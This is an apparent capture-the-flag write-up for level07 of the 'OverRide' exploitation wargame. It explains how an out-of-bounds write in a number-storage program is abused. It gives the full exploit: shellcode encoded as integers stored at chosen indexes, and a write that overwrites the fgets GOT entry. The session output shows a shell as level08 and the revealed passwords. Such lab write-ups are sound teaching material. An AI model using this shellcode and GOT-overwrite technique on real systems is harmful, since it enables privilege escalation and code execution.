# Level level07

## how to login

username: level07

password: GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8

## Goal

read `.pass` as user `level08`

## Actually doing something

When looking at the program:
We have 3 simple commands: store, read and quit

quit is simple, it just returns from the main function.

read will prompt the user to get an index, and reads from the given index
store will prompt the user to give a number, and which index to write it to

the only issue is that if the index is either a multiple of 3, the highest byte of the index is equal to `0xB7` it will fail because wil restricted those.

This means that in theory we can write almost anywhere we want since no bounds checks are done (given that the address isn't a multiple of 3)

We can only write 8 consecutive bytes at a time, and the other bytes will be filled with zeros (if we stay in the stack buffer !)

`00 00` in assembly means `add BYTE PTR [eax], al`. This requires that `eax` points to a valid address when stepping into the "no write zones"

The payload we currently uses can't do that. So I modifed it such that no instruction is cut, and the `eax` register is made to point to a valid address.

We then use the fact that we can write anywhere to override the `fgets@plt.got` pointer to pointto our payload, triggering it instantly since it calls `fgets` everytime we finished a "command"

Getting a shell.

Here is the full payload in action

```bash
level07@OverRide:~$ env -i COLUMNS=107 PWD=/home/users/level07 LINES=58 ~/level07 
[..cut..]
Input command: store
 Number: 77652152
 Index: 1
 Completed store command successfully
Input command: store
 Number: 1372139784
 Index: 2
 Completed store command successfully
Input command: store
 Number: 1932472168
 Index: 4
 Completed store command successfully
Input command: store
 Number: 2425393256
 Index: 5
 Completed store command successfully
Input command: store
 Number: 1768042344
 Index: 7
 Completed store command successfully
Input command: store
 Number: 2425393262
 Index: 8
 Completed store command successfully
Input command: store
 Number: 3375489929
 Index: 10
 Completed store command successfully
Input command: store
 Number: 2425410097
 Index: 11
 Completed store command successfully
Input command: store
 Number: 196132913
 Index: 13
 Completed store command successfully
Input command: store
 Number: 2425389261
 Index: 14
 Completed store command successfully
Input command: store
 Number: 4294958168
 Index: 33632494
 Completed store command successfully
$ id
uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
$ cat ~level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

Yes I copied every number by hand

Here is the python script:
```bash
python ./levels/7/ressources/mkpayload.py
[ 1] =   77652152 (04a0e0b8)
[ 2] = 1372139784 (51c93108)
[ 4] = 1932472168 (732f2f68)
[ 5] = 2425393256 (90909068)
[ 7] = 1768042344 (69622f68)
[ 8] = 2425393262 (9090906e)
[10] = 3375489929 (c931e389)
[11] = 2425410097 (9090d231)
[13] =  196132913 (0bb0c031)
[14] = 2425389261 (909080cd)




TRIGGER:
[33632494] = 4294958168
How to get this ? go to https://www.wolframalpha.com/input?i=1073739541+%2B+x+%3D%3D+33630211+Mod[2^30]
```

Yes wolframalpha was used. I dont know how to do modular arithmetic in python. slapping a `%` doesnt work...
